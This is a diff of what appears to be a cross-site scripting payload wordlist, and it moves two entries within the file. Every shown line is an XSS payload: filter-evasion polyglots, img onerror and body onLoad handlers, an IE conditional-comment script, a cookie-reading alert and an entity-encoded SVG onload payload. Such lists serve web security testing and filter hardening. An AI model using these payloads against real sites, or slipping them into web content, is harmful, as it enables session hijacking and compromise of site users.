@@ -1,5 +1,3 @@
-<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
-alert(document['cookie'])
 <!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
 "><img src=x&#9;onerror=prompt(document.domain);>
 <script src="#">{alert(101101)}</script>;1
@@ -17,6 +15,8 @@ alert(document['cookie'])
 <img/src=x onError="`${x}`;alert(`Hello`);">
 <a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
 --><!-- --\x21> <img src=xxx:x onerror=javascript:alert(101101)> -->
+<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+alert(document['cookie'])
 %22%3e%3c%53%56%47%20%4f%4e%4c%4f%41%44%3d%26%23%39%37%26%23%31%30%38%26%23%31%30%31%26%23%31%31%34%26%23%31%31%36%28%26%23%78%36%34%26%23%78%36%66%26%23%78%36%33%26%23%78%37%35%26%23%78%36%64%26%23%78%36%35%26%23%78%36%65%26%23%78%37%34%26%23%78%32%65%26%23%78%36%34%26%23%78%36%66%26%23%78%36%64%26%23%78%36%31%26%23%78%36%39%26%23%78%36%65%29%3e
 <body onLoad body onLoad="javascript:javascript:alert(101101)"></body onLoad>
 element[attribute='<img src=x onerror=alert('101101');>
